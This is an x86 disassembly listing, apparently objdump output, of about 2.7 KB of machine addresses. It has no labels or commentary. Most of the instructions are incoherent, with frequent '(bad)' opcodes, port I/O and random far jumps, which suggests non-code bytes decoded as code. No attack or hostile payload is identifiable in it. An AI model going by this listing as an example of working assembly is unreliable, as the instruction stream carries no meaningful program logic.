  420d7a:	ret    0x3098
  420d7d:	lds    esp,FWORD PTR [edx-0x7be9b186]
  420d83:	and    edx,DWORD PTR [esi]
  420d85:	and    eax,0x7c16e7e3
  420d8a:	rol    DWORD PTR [ebx],cl
  420d8c:	scas   eax,DWORD PTR es:[edi]
  420d8d:	call   0x42273a
	...
  420df2:	add    BYTE PTR [eax],al
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0xc2b5a6ee
  420e04:	add    al,0x5e
  420e06:	add    DWORD PTR [eax],eax
  420e08:	add    al,0x1
  420e0a:	add    BYTE PTR [eax],al
  420e0c:	xlat   BYTE PTR ds:[ebx]
  420e0d:	sbb    ebp,DWORD PTR [ebx+0x70]
  420e10:	imul   eax,ecx,0x26
  420e13:	dec    ebp
  420e14:	jg     0x420e88
  420e16:	out    0x80,eax
  420e18:	and    DWORD PTR [ebx],edx
  420e1a:	sbb    al,BYTE PTR [edi-0x8]
  420e1d:	push   esp
  420e1e:	cmp    ebx,DWORD PTR [ebp-0x41197e51]
  420e24:	stos   DWORD PTR es:[edi],eax
  420e25:	xchg   ebx,eax
  420e26:	or     DWORD PTR [ebx+0x12],esp
  420e29:	fisub  DWORD PTR [edx+0x0]
  420e2c:	xlat   BYTE PTR ds:[ebx]
  420e2d:	mov    ebx,0x57ac7255
  420e32:	dec    eax
  420e33:	fnstsw WORD PTR [edx]
  420e35:	or     al,0x7c
  420e37:	xor    eax,0x43447a42
  420e3c:	ret    0x2904
  420e3f:	loope  0x420e3c
  420e41:	mov    dh,0x6f
  420e43:	call   0x644557f
  420e48:	retf   
  420e49:	mov    ebx,0x58bcc6b4
  420e4e:	xchg   ebp,eax
  420e4f:	lods   al,BYTE PTR ds:[esi]
  420e50:	(bad)  
  420e51:	pop    eax
  420e52:	sti    
  420e53:	cmc    
  420e54:	sahf   
  420e55:	scas   eax,DWORD PTR es:[edi]
  420e56:	mov    bl,0xfb
  420e58:	pushf  
  420e59:	test   eax,0xa512d11a
  420e5e:	cmp    eax,0x90a1608b
  420e63:	jl     0x420e49
  420e65:	sub    al,0xcb
  420e67:	mov    ch,0x59
  420e69:	daa    
  420e6a:	or     ah,BYTE PTR ds:0x3d8a9530
  420e70:	adc    cl,ch
  420e72:	sbb    ebx,DWORD PTR ds:0xe9c9390d
  420e78:	sti    
  420e79:	(bad)  
  420e7a:	sub    bh,BYTE PTR ds:0x4d646ef5
  420e80:	mov    ebx,0x9b2976b
  420e85:	xchg   edx,eax
  420e86:	test   al,0x21
  420e88:	fisub  DWORD PTR [esi-0x3d816b68]
  420e8e:	daa    
  420e8f:	imul   edi,DWORD PTR [ecx-0x2b],0x1b597850
  420e96:	dec    esi
  420e97:	loopne 0x420e33
  420e99:	jl     0x420e57
  420e9b:	rcr    BYTE PTR [esi+edi*8+0x6b836d44],cl
  420ea2:	mov    ch,0xb3
  420ea4:	xor    eax,0xef1eeaaf
  420ea9:	into   
  420eaa:	mov    esp,0x8e8da769
  420eaf:	out    0xdb,eax
  420eb1:	sub    DWORD PTR [ebp+0x6],0xffffff85
  420eb5:	xor    BYTE PTR [ebp+eax*4+0x550e171d],al
  420ebc:	fdivr  QWORD PTR [ecx-0x1fa15586]
  420ec2:	mov    eax,ds:0x51893bcc
  420ec7:	sbb    eax,0xeb8bae46
  420ecc:	mov    esp,DWORD PTR [ebx+0x259420fe]
  420ed2:	push   esp
  420ed3:	mov    edx,0xac7ab336
  420ed8:	mov    esi,0x948b0abf
  420edd:	pop    ss
  420ede:	ja     0x420ecb
  420ee0:	dec    edx
  420ee1:	jle    0x420efe
  420ee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ee4:	and    al,0x78
  420ee6:	inc    esp
  420ee7:	cmp    DWORD PTR [edx+0x65],ebp
  420eea:	jmp    0x93b08c
  420eef:	sub    BYTE PTR [ecx+0x5e],0x17
  420ef3:	or     al,0x28
  420ef5:	or     al,0x7d
  420ef7:	mov    bl,0x95
  420ef9:	stos   DWORD PTR es:[edi],eax
  420efa:	push   esi
  420efb:	pop    es
  420efc:	push   ebp
  420efd:	inc    ebp
  420efe:	mov    al,0x7b
  420f00:	int    0x8f
  420f02:	inc    eax
  420f03:	cld    
  420f04:	cmp    al,0xd9
  420f06:	jmp    0xff17a0f7
  420f0b:	mov    ?,WORD PTR [ebp+0x50]
  420f0e:	outs   dx,DWORD PTR ds:[esi]
  420f0f:	mov    al,BYTE PTR [eax]
	...
  420f71:	add    BYTE PTR [eax],al
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi+0x6f086c46]
  420f84:	or     BYTE PTR [edi+0x1],bl
  420f87:	add    BYTE PTR [ecx+eax*1],al
  420f8a:	add    BYTE PTR [eax],al
  420f8c:	fldcw  WORD PTR [edi+esi*2]
  420f8f:	or     ecx,edi
  420f91:	push   ebx
  420f92:	jmp    0xbfc1:0x71deca8a
  420f99:	dec    edi
  420f9a:	pop    es
  420f9b:	mov    ds:0x6268607,eax
  420fa0:	add    BYTE PTR [ebx],ch
  420fa2:	cmp    edi,DWORD PTR [edx-0x40]
  420fa5:	mov    eax,ds:0x90841028
  420faa:	push   eax
  420fab:	jmp    0xd5a1:0xb24cc885
  420fb2:	pop    edi
  420fb3:	mov    dl,0xb1
  420fb5:	pusha  
  420fb6:	js     0x420fa9
  420fb8:	xor    ecx,DWORD PTR [ecx-0x7c]
  420fbb:	mov    ecx,0x1a2c5493
  420fc0:	dec    esi
  420fc1:	stos   DWORD PTR es:[edi],eax
  420fc2:	push   0x26
  420fc4:	mov    bl,cl
  420fc6:	(bad)  
  420fc7:	push   0x7acb43cd
  420fcc:	stc    
  420fcd:	(bad)  
  420fce:	fstp   TBYTE PTR [ecx-0x2ff22100]
  420fd4:	inc    DWORD PTR ds:0x2a53a6f8
  420fda:	inc    esp
  420fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fdc:	inc    bh
  420fde:	inc    edx
  420fdf:	mov    bh,0x8
  420fe1:	adc    BYTE PTR [ecx-0x5f],al
  420fe4:	jg     0x421003
  420fe6:	nop
  420fe7:	xor    cl,BYTE PTR [ecx]
  420fe9:	int    0x77
  420feb:	jecxz  0x420fc3
  420fed:	mov    dl,0xb8
  420fef:	mov    eax,ds:0xef767a17
  420ff4:	or     DWORD PTR [esi],esi
  420ff6:	jg     0x42100b
  420ff8:	dec    esp
  420ff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ffa:	cld    
  420ffb:	add    eax,0xd27231bc
  421000:	cdq    
  421001:	jbe    0x421077
  421003:	stos   DWORD PTR es:[edi],eax
  421004:	mov    eax,esi
  421006:	push   ebx
  421007:	or     DWORD PTR [ebx-0x44],edi
  42100a:	(bad)  
  42100b:	int    0xf
  42100d:	cmp    al,0x8a
  42100f:	arpl   WORD PTR [ecx+ebp*8+0x6c2f073e],bp
  421016:	shr    DWORD PTR [ecx+0x71],0x34
  42101a:	mov    esi,0x5b05cbdc
  42101f:	cld    
  421020:	inc    ecx
  421021:	and    al,0x89
  421023:	rcl    BYTE PTR [ebx+eiz*2],0x92
  421027:	push   eax
  421028:	out    0x57,al
  42102a:	xchg   esi,eax
  42102b:	pop    edx
  42102c:	add    cl,ah
  42102e:	pop    ebx
  42102f:	test   BYTE PTR [esp+edx*2],bh
  421032:	fsub   DWORD PTR ds:0xe3d428c4
  421038:	mov    eax,ds:0xd3d04ae1
  42103d:	xchg   ebx,eax
  42103e:	inc    eax
  42103f:	push   ss
  421040:	ja     0x42102a
  421042:	outs   dx,DWORD PTR ds:[esi]
  421043:	sti    
  421044:	xchg   esi,eax
  421045:	fwait
  421046:	cmp    cl,BYTE PTR [esi]
  421048:	jae    0x42101a
  42104a:	jbe    0x421057
  42104c:	mov    bl,0xa8
  42104e:	inc    esp
  42104f:	dec    ebp
  421050:	jecxz  0x420ff8
  421052:	add    al,0xb0
  421054:	pop    ss
  421055:	leave  
  421056:	mov    ecx,0xfa439055
  42105b:	imul   ebx,DWORD PTR [ebp+ebx*4+0x4c],0xe8940c1c
  421063:	and    BYTE PTR [esi+0x76029d2c],cl
  421069:	(bad)  
  42106a:	in     al,0x7
  42106c:	dec    esi
  42106d:	mov    bl,0x4e
  42106f:	stc    
  421070:	add    BYTE PTR [esi-0x6c],dh
  421073:	and    al,0xb7
  421075:	and    al,0x57
  421077:	mov    edi,DWORD PTR [eax]
  421079:	rcl    BYTE PTR [edi+0x5cdb07aa],1
  42107f:	sbb    DWORD PTR [edi],esp
  421081:	fcomp  DWORD PTR [ebx-0x6b0942f4]
  421087:	push   ecx
  421088:	(bad)  
  421089:	or     edx,eax
  42108b:	retf   
  42108c:	popa   
  42108d:	xchg   edx,eax
  42108e:	(bad)  
	...
  4210f4:	lahf   
  4210f5:	pop    esi
  4210f6:	fcmovb st,st(6)
  4210f8:	fcmovnb st,st(6)
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    gs,WORD PTR [ebp+0xcc6b696]
  421105:	pusha  
  421106:	add    DWORD PTR [eax],eax
  421108:	add    al,0x1
  42110a:	add    BYTE PTR [eax],al
  42110c:	js     0x42114f
  42110e:	test   BYTE PTR ds:0x2eba614c,dh
  421114:	outs   dx,DWORD PTR ds:[esi]
  421115:	or     DWORD PTR [edx-0x4b],esp
  421118:	(bad)  
  421119:	das    
  42111a:	test   al,0x6f
  42111c:	push   ds
  42111d:	jns    0x4210f3
  42111f:	or     BYTE PTR [ecx+0x555dda41],cl
  421125:	shr    esi,1
  421127:	js     0x421128
  421129:	icebp  
  42112a:	sub    ecx,DWORD PTR [edi-0x40]
  42112d:	push   es
  42112e:	sti    
  42112f:	or     ecx,DWORD PTR [eax-0x5a]
  421132:	cmp    DWORD PTR [edx],ebp
  421134:	scas   eax,DWORD PTR es:[edi]
  421135:	and    eax,0xa2abf73
  42113a:	arpl   WORD PTR [ebp+0x6],dx
  42113d:	mov    edx,ebp
  42113f:	icebp  
  421140:	jmp    0x421140
  421142:	add    eax,0x9a01ab02
  421147:	inc    eax
  421148:	push   cs
  421149:	nop
  42114a:	mov    eax,0x4d054ba1
  42114f:	pop    ecx
  421150:	jl     0x421196
  421152:	pop    ecx
  421153:	sub    al,0x34
  421155:	ret    0xd9e
  421158:	add    al,0x3c
  42115a:	mov    cl,0xb
  42115c:	or     eax,0x56f452d0
  421161:	jnp    0x421139
  421163:	push   ebx
  421164:	xchg   ebx,eax
  421165:	hlt    
  421166:	iret   
  421167:	fsqrt  
  421169:	push   es
  42116a:	das    
  42116b:	or     edx,DWORD PTR [edx+0x6a]
  42116e:	mov    cl,0xea
  421170:	test   al,0x72
  421172:	repnz scas eax,DWORD PTR es:[edi]
  421174:	push   0xe7fecb12
  421179:	push   cs
  42117a:	pop    esi
  42117b:	sbb    eax,DWORD PTR [ecx]
  42117d:	inc    edi
  42117e:	cmp    bh,BYTE PTR ds:0xda099e15
  421184:	add    DWORD PTR [ecx-0x1],esp
  421187:	retf   0x85f7
  42118a:	call   0x3ac047d9
  42118f:	frstor [ebx]
  421191:	bnd jns 0x421156
  421194:	xchg   esp,eax
  421195:	pop    esi
  421197:	add    DWORD PTR [ecx],edx
  421199:	pop    ecx
  42119a:	xchg   ebx,eax
  42119b:	div    BYTE PTR [eax+eax*8+0x62]
  42119f:	dec    ecx
  4211a0:	inc    esp
  4211a1:	int3   
  4211a2:	ret    
  4211a3:	pminsw mm6,mm6
  4211a6:	stos   DWORD PTR es:[edi],eax
  4211a7:	add    esp,DWORD PTR cs:[edx-0x1140811f]
  4211ae:	jg     0x4211a7
  4211b0:	sbb    bh,ah
  4211b2:	retf   0xac04
  4211b5:	mov    BYTE PTR [ebx],dh
  4211b7:	pop    ebp
  4211b8:	mov    eax,ds:0x81a05ed
  4211bd:	xlat   BYTE PTR ds:[ebx]
  4211be:	push   eax
  4211bf:	bound  bx,DWORD PTR [edx-0x6]
  4211c3:	push   0xa08eb74
  4211c8:	mov    esi,0xededaaf4
  4211cd:	pop    ds
  4211ce:	adc    cl,BYTE PTR [edi+0x70]
  4211d1:	(bad)  
  4211d2:	js     0x42116a
  4211d4:	pop    edi
  4211d5:	pop    ebx
  4211d6:	or     esp,edx
  4211d8:	xor    ebp,DWORD PTR [edx]
  4211da:	nop
  4211db:	mov    dh,0xc1
  4211dd:	test   eax,0x9a880151
  4211e2:	cmp    al,0x95
  4211e4:	popf   
  4211e5:	ds push 0xffffffe3
  4211e8:	cmp    ebp,edi
  4211ea:	xor    DWORD PTR [eax-0x28],0xffffffb9
  4211ee:	test   eax,0x76ecdba6
  4211f3:	into   
  4211f4:	push   ds
  4211f5:	xor    eax,0x7cebfbef
  4211fa:	mov    ebx,0x4712aa8
  4211ff:	mov    edi,esp
  421201:	lea    esi,[ebx]
  421203:	ds inc edi
  421205:	cdq    
  421206:	sub    al,0xba
  421208:	test   eax,0x4cd5f970
  42120d:	imul   ecx,DWORD PTR [edx],0x36
	...
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0x984d7ab3
  421282:	mov    ecx,DWORD PTR [edi]
  421284:	adc    BYTE PTR [ecx+0x1],ah
  421287:	add    BYTE PTR [ecx+eax*1],al
  42128a:	add    BYTE PTR [eax],al
  42128c:	xchg   ebp,eax
  42128d:	or     ebp,edx
  42128f:	adc    DWORD PTR [esi-0x39dc9256],ebx
  421295:	jnp    0x421251
  421297:	mov    al,ds:0x58a546dd
  42129c:	(bad)  
  42129d:	je     0x421262
  42129f:	test   al,0x74
  4212a1:	cmp    al,al
  4212a3:	or     al,0x32
  4212a5:	clc    
  4212a6:	stc    
  4212a7:	and    BYTE PTR [edx+0x22],cl
  4212aa:	(bad)  
  4212ab:	jo     0x42124c
  4212ad:	xor    ebx,DWORD PTR [edx-0x7d8df039]
  4212b3:	sti    
  4212b4:	add    eax,0xe04c8978
  4212b9:	repnz pop ss
  4212bb:	iret   
  4212bc:	jmp    0x41ec15b3
  4212c1:	cmp    al,BYTE PTR [edi+0x3e207490]
  4212c7:	fst    st(5)
  4212c9:	jbe    0x421333
  4212cb:	sub    al,0x75
  4212cd:	mov    ebx,0x940f085c
  4212d2:	sbb    eax,0x94d4417d
  4212d7:	adc    al,0x13
  4212d9:	aad    0x20
  4212db:	imul   esp,DWORD PTR [eax-0x35dd9134],0xa068577f
  4212e5:	pushf  
  4212e6:	je     0x4212e9
  4212e8:	fidivr WORD PTR [ecx]
  4212ea:	dec    ebx
  4212eb:	iret   
  4212ec:	in     eax,dx
  4212ed:	repnz cmp al,0x57
  4212f0:	std    
  4212f1:	pop    ecx
  4212f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212f3:	mov    eax,ds:0xbea176e1
  4212f8:	ret    0xd984
  4212fb:	fwait
  4212fc:	push   es
  4212fd:	aas    
  4212fe:	push   edi
  4212ff:	test   al,0x5c
  421301:	inc    eax
  421302:	push   ecx
  421303:	adc    DWORD PTR [ebx],esp
  421305:	mov    al,ds:0x30345d13
  42130a:	pop    ecx
  42130b:	aaa    
  42130c:	fidiv  WORD PTR [esi+0x22]
  42130f:	cli    
  421310:	neg    BYTE PTR [esi-0x57eb29a4]
  421316:	(bad)  
  421317:	jmp    0x4212f9
  421319:	icebp  
  42131a:	push   0xffffffe9
  42131c:	and    eax,DWORD PTR [esi+0x4d1be255]
  421322:	xlat   BYTE PTR cs:[ebx]
  421324:	stos   BYTE PTR es:[edi],al
  421325:	iret   
  421326:	out    0xd4,al
  421328:	sbb    cl,BYTE PTR [edx+0x11]
  42132b:	lds    edx,FWORD PTR [edx]
  42132d:	xor    edi,0x5a
  421330:	xchg   esp,eax
  421331:	xchg   esp,eax
  421332:	in     al,dx
  421333:	mov    edi,0x5a5cc6a9
  421338:	pop    ebp
  421339:	sub    bl,0x70
  42133c:	std    
  42133d:	pop    edx
  42133e:	and    eax,0xa1241d3f
  421343:	pop    esp
  421344:	inc    ebp
  421345:	push   edi
  421346:	xchg   esi,eax
  421347:	inc    ebp
  421348:	enter  0x5aa4,0x55
  42134c:	retf   0xd931
  42134f:	ret    0xa53e
  421352:	or     edx,ebx
  421354:	(bad)  
  421355:	push   ss
  421356:	xchg   esp,eax
  421357:	jmp    0x9f886a23
  42135c:	outs   dx,DWORD PTR ds:[esi]
  42135d:	mov    eax,ds:0x191a564d
  421362:	sub    eax,0xaab82312
  421367:	and    eax,0x96636540
  42136c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42136d:	pop    ss
  42136e:	adc    esi,ebp
  421370:	mov    cs,eax
  421372:	adc    eax,0xa7272f6a
  421377:	sbb    ebp,DWORD PTR [esp+eiz*2]
  42137a:	and    eax,0xb34648d6
  42137f:	cmp    DWORD PTR [ecx-0x793d8338],esp
  421385:	mov    ecx,0x4f991c8e
  42138a:	jno    0x4213cf
  42138c:	scas   eax,DWORD PTR es:[edi]
  42138d:	add    BYTE PTR [ebx],ch
  42138f:	stos   BYTE PTR es:[edi],al
	...
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp+0x46a9f49f]
  421402:	dec    BYTE PTR ds:0x16214
  421408:	add    al,0x1
  42140a:	add    BYTE PTR [eax],al
  42140c:	(bad)  
  42140d:	out    dx,al
  42140e:	xchg   edi,eax
  42140f:	out    0xdb,eax
  421411:	cmp    ebx,esi
  421413:	enter  0x300a,0xb1
  421417:	test   ebx,0xec655733
  42141d:	inc    ebx
  42141e:	pop    esp
  42141f:	xchg   DWORD PTR [edi+0x28cd8bbe],edi
  421425:	jno    0x4213fa
  421427:	adc    cl,cl
  421429:	cmp    BYTE PTR ds:0x9d0ac2ba,cl
  42142f:	jno    0x42146e
  421431:	xchg   BYTE PTR [esi+ebx*2],al
  421434:	neg    eax
  421436:	and    DWORD PTR [ebx-0x5e412b6e],0x64
  42143d:	and    BYTE PTR [ecx],al
  42143f:	ins    BYTE PTR es:[edi],dx
  421440:	mov    DWORD PTR [ebx],ebx
  421442:	in     eax,dx
  421443:	sbb    ecx,ebp
  421445:	pop    edx
  421446:	pushf  
  421447:	add    ah,dh
  421449:	rcl    BYTE PTR [ebp+0x74],1
  42144c:	or     DWORD PTR [ebp-0x465c5be8],edx
  421452:	nop
  421453:	cmp    bl,dl
  421455:	arpl   WORD PTR [ebp-0x62],sp
  421458:	jo     0x4214c9
  42145a:	in     eax,0xb1
  42145c:	inc    esp
  42145d:	mov    cl,0xdd
  42145f:	add    DWORD PTR [ebx],edi
  421461:	out    0x1e,al
  421463:	stc    
  421464:	adc    DWORD PTR ds:0x9cf8c693,edx
  42146a:	iret   
  42146b:	aaa    
  42146c:	test   BYTE PTR [ebp+0x707fea15],dl
  421472:	aas    
  421473:	sub    edx,ebx
  421475:	fist   WORD PTR [ebx+0x4a]
  421478:	jae    0x42144a
  42147a:	add    DWORD PTR [esp+edx*8],0xf48e19f1
  421481:	sub    al,0x2e
  421483:	mov    ecx,0x89388f56
  421488:	push   ss
  421489:	hlt    
  42148a:	mov    esi,0x4428151f
  42148f:	js     0x421480
  421491:	inc    ebp
  421492:	out    dx,al
  421493:	push   es
  421494:	fadd   DWORD PTR [edi+ebp*1+0x3a3f895b]
  42149b:	push   ebx
  42149c:	inc    eax
  42149d:	pop    esp
  42149e:	outs   dx,DWORD PTR ds:[esi]
  42149f:	ss (bad) 
  4214a1:	shl    ch,1
  4214a3:	add    DWORD PTR [edx-0x2d1db2d2],0x5b
  4214aa:	or     ebp,DWORD PTR [ecx-0x2e]
  4214ad:	add    eax,0x14ee4454
  4214b2:	mov    ecx,0xb52f2763
  4214b7:	into   
  4214b8:	xchg   ecx,eax
  4214b9:	and    eax,0x871b4d16
  4214be:	cmc    
  4214bf:	add    eax,0x3add2982
  4214c4:	xchg   DWORD PTR [esi],ecx
  4214c6:	stos   DWORD PTR es:[edi],eax
  4214c7:	(bad)  
  4214c8:	ja     0x4214bf
  4214ca:	mov    ds,WORD PTR [esi+0x4d]
  4214cd:	imul   ecx,DWORD PTR [eax-0x63],0xd3761f65
  4214d4:	cmp    BYTE PTR [esi-0x23],ah
  4214d7:	gs dec edx
  4214d9:	cmp    BYTE PTR [ebx+0x5b],cl
  4214dc:	pop    ebp
  4214dd:	in     eax,0x4c
  4214df:	dec    edi
  4214e0:	push   ecx
  4214e1:	pop    ebp
  4214e2:	jg     0x421503
  4214e4:	lods   eax,DWORD PTR ds:[esi]
  4214e5:	loopne 0x421556
  4214e7:	ficomp DWORD PTR [ebp-0x1c]
  4214ea:	or     eax,0xbb88fbfc
  4214ef:	rcl    DWORD PTR [edx-0x5b],0xf4
  4214f3:	es sahf 
  4214f5:	xchg   ebx,eax
  4214f6:	add    dl,BYTE PTR [esi+0xf7dd84a]
  4214fc:	fcomp  QWORD PTR [edx]
  4214fe:	cmp    bl,0xd1
  421501:	cmc    
  421502:	stc    
  421503:	pop    edx
  421504:	es sbb eax,0xdb465f49
  42150a:	call   0x9e:0xe69a8369
	...
  421571:	add    BYTE PTR [eax],al
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0xac0bd4c],bp
  421582:	xor    ch,ch
  421584:	sbb    BYTE PTR [ebx+0x1],ah
  421587:	add    BYTE PTR [ecx+eax*1],al
  42158a:	add    BYTE PTR [eax],al
  42158c:	popa   
  42158d:	sbb    eax,DWORD PTR [ecx]
  42158f:	sbb    eax,0x9f880076
  421594:	or     bl,BYTE PTR [edi-0x5c]
  421597:	outs   dx,DWORD PTR ds:[esi]
  421598:	(bad)  
  421599:	lds    esi,FWORD PTR [ebp-0x6e152fc1]
  42159f:	into   
  4215a0:	mov    ds:0x21b34d1d,eax
  4215a5:	jns    0x421569
  4215a7:	mov    al,0x17
  4215a9:	inc    ecx
  4215aa:	outs   dx,DWORD PTR ds:[esi]
  4215ab:	cs inc esi
  4215ad:	cmp    BYTE PTR [ecx-0x24a7c6ff],dl
  4215b3:	(bad)  
  4215b4:	and    al,0xf9
  4215b6:	xchg   ebp,eax
  4215b7:	or     eax,0xc2a006ab
  4215bc:	test   al,0xbf
  4215be:	cmp    ah,BYTE PTR [esi]
  4215c0:	adc    esi,DWORD PTR [ecx+0x5b4e49f3]
  4215c6:	ss fcomp st(4)
  4215c9:	cmp    DWORD PTR [ebx+eax*1],0x3d5ac171
  4215d0:	ins    DWORD PTR es:[edi],dx
  4215d1:	inc    edi
  4215d2:	jp     0x421556
  4215d4:	mov    ebx,0xcfb0076b
  4215d9:	and    dh,BYTE PTR [edx+ecx*8]
  4215dc:	xchg   edi,eax
  4215dd:	add    esi,DWORD PTR [eax+0x3c]
  4215e0:	dec    eax
  4215e1:	cmp    ecx,DWORD PTR [ebp+0x2d65731b]
  4215e7:	test   DWORD PTR ds:0x647dbd3a,ecx
  4215ed:	lock shr DWORD PTR [ebp+0x3f],cl
  4215f1:	popa   
  4215f2:	arpl   WORD PTR [edi-0x71],cx
  4215f5:	je     0x4215e0
  4215f7:	js     0x42166a
  4215f9:	sub    eax,0xf57c4033
  4215fe:	xor    DWORD PTR [edi],ebx
  421600:	inc    eax
  421601:	ret    0x8886
  421604:	mov    ebx,0xcab4cc8c
  421609:	push   ds
  42160a:	adc    ah,BYTE PTR [edi]
  42160c:	inc    edi
  42160d:	icebp  
  42160e:	sbb    eax,0x8f2e8743
  421613:	jo     0x421643
  421615:	push   ss
  421616:	jp     0x42159d
  421618:	cmp    eax,0x564f588f
  42161d:	pushf  
  42161e:	ja     0x421691
  421620:	cmc    
  421621:	and    edi,0xffffff85
  421624:	shl    ah,1
  421626:	daa    
  421627:	ins    BYTE PTR es:[edi],dx
  421628:	call   0xf750e8ef
  42162d:	inc    edi
  42162e:	add    eax,0x9ecf89ca
  421633:	sbb    eax,0x6e505c00
  421638:	and    al,0xa1
  42163a:	mov    al,BYTE PTR [ebp+0xe]
  42163d:	in     al,dx
  42163e:	std    
  42163f:	cmp    al,0x56
  421641:	test   BYTE PTR [esi+0x40],al
  421644:	add    eax,0xf1e3ffa
  421649:	loopne 0x4216a2
  42164b:	cmp    ebx,ebp
  42164d:	dec    eax
  42164e:	lods   eax,DWORD PTR ds:[esi]
  42164f:	ja     0x4216aa
  421651:	xor    ebx,ebx
  421653:	lods   al,BYTE PTR ds:[esi]
  421654:	gs sub al,0x8a
  421657:	test   eax,0xa964cae7
  42165c:	in     eax,0x58
  42165e:	ins    DWORD PTR es:[edi],dx
  42165f:	xchg   ebp,eax
  421660:	inc    edx
  421661:	loop   0x42168d
  421663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421664:	pushf  
  421665:	sbb    al,0x33
  421667:	xchg   edx,eax
  421668:	lock ja 0x4216cf
  42166b:	inc    eax
  42166c:	mov    esp,0x8dc4a6ec
  421671:	(bad)  
  421672:	cmp    BYTE PTR [ebp+0x17],bl
  421675:	xor    DWORD PTR [ebp-0x517b9564],0x5c1ffb56
  42167f:	sbb    ch,BYTE PTR [edi+0x4ed00460]
  421685:	addr16 inc bp
  421688:	loop   0x421694
  42168a:	xor    DWORD PTR [eax+0x64],eax
  42168d:	sti    
  42168e:	fdiv   DWORD PTR [esi+0x0]
	...
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	(bad)  
  421701:	mov    ch,0x1e
  421703:	outs   dx,DWORD PTR ds:[esi]
  421704:	sbb    al,0x64
  421706:	add    DWORD PTR [eax],eax
  421708:	add    al,0x1
  42170a:	add    BYTE PTR [eax],al
  42170c:	mov    ebx,DWORD PTR [edx-0x6b29ff9c]
  421712:	push   ebx
  421713:	enter  0x13c5,0x65
  421717:	sti    
  421718:	cdq    
  421719:	inc    eax
  42171a:	lock into 
  42171c:	jle    0x421779
  42171e:	ins    DWORD PTR es:[edi],dx
  42171f:	out    0xf1,eax
  421721:	push   es
  421722:	jne    0x42178f
  421724:	sahf   
  421725:	repz data16 clc 
  421728:	add    ebp,ecx
  42172a:	sub    bl,BYTE PTR [edi]
  42172c:	idiv   BYTE PTR [eax+eax*2-0x73]
  421730:	inc    ebx
  421731:	jno    0x4216c0
  421733:	add    ch,ah
  421735:	test   al,0xa2
  421737:	loopne 0x42173e
  421739:	xor    eax,0xfcef37e4
  42173e:	es loop 0x421764
  421741:	jmp    0xa93ece22
  421746:	leave  
  421747:	inc    ebp
  421748:	dec    edx
  421749:	inc    esi
  42174a:	pusha  
  42174b:	pop    ebp
  42174c:	dec    ah
  42174e:	shl    edi,1
  421750:	sub    DWORD PTR [edx+0x51],esi
  421753:	sbb    ch,al
  421755:	xor    eax,DWORD PTR [ebp+0x1356d582]
  42175b:	or     ah,ch
  42175d:	xchg   ebx,eax
  42175e:	repz das 
  421760:	shr    edx,0xfc
  421763:	mov    cl,0xbc
  421765:	pop    edx
  421766:	loope  0x421750
  421768:	out    0xa0,eax
  42176a:	cwde   
  42176b:	repz adc eax,0x39f39e51
  421771:	mov    DWORD PTR [edx+0x52],edx
  421774:	fnstenv [ebp-0x4e]
  421777:	call   DWORD PTR [edx]
  421779:	jmp    0x739f:0x2a0b8f8a
  421780:	pop    ss
  421781:	jg     0x421771
  421783:	mov    cl,0x44
  421785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421786:	jmp    FWORD PTR [ebp+0x5f1cd3be]
  42178c:	repnz dec ebx
  42178e:	rcl    DWORD PTR [eax-0x51],1
  421791:	dec    ebp
  421792:	inc    ecx
  421793:	(bad)  
  421794:	cmp    BYTE PTR [eax-0x3c],bl
  421797:	push   ecx
  421798:	test   BYTE PTR [esi+0x57],ah
  42179b:	jo     0x4217db
  42179d:	dec    ebx
  42179e:	push   edx
  42179f:	sub    ah,BYTE PTR [ebp-0x58fed471]
  4217a5:	xor    DWORD PTR [eax-0x9],esi
  4217a8:	out    0x2,al
  4217aa:	and    DWORD PTR [ecx+0x52],esp
  4217ad:	inc    ebp
  4217ae:	inc    edx
  4217af:	outs   dx,DWORD PTR ds:[esi]
  4217b0:	inc    ecx
  4217b1:	call   FWORD PTR [ebx+0x7]
  4217b4:	mov    ch,0xfb
  4217b6:	jne    0x4217c8
  4217b8:	fxch   st(5)
  4217ba:	mov    eax,0xd8a6772d
  4217bf:	js     0x42174e
  4217c1:	or     eax,0xb3416a6f
  4217c6:	cmp    BYTE PTR [ebp-0xbdbfc80],0xc1
  4217cd:	push   esi
  4217ce:	dec    edx
  4217cf:	mov    dh,0x2d
  4217d1:	mov    dl,0x55
  4217d3:	xor    al,0x96
  4217d5:	loop   0x4217d8
  4217d7:	and    al,0xf9
  4217d9:	psrlw  mm1,QWORD PTR [ebx]
  4217dc:	xchg   ecx,eax
  4217dd:	mov    al,0x40
  4217df:	push   es
  4217e0:	mov    ebx,0xc9873113
  4217e5:	iret   
  4217e6:	xor    ebp,DWORD PTR [esp+esi*1-0x5db11375]
  4217ed:	hlt    
  4217ee:	shr    DWORD PTR [ebx+0x4f],0x7e
